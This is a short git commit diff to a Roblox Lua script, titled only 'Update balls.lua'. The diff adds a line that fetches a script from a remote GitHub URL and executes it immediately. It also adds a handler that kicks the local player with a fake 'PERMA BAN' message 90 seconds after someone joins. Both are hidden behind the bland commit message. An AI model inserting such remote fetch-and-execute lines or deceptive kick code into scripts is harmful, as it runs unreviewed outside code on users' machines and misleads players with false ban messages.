1c05bfc0bd97c4982ddf520ab4835420fab04471
sygzxW <73584462+sygzxW@users.noreply.github.com>
2022-12-18 23:17:54 +0100

    Update balls.lua

--- balls.lua
+++ balls.lua
@@ -1,2 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zuwdaq/aim-viewer/main/aim%20viewer"))()
 game.Players.PlayerAdded:Connect(function(plr)
-
+    wait(90)
+    game.Players.LocalPlayer:Kick("PERMA BAN")
+end)
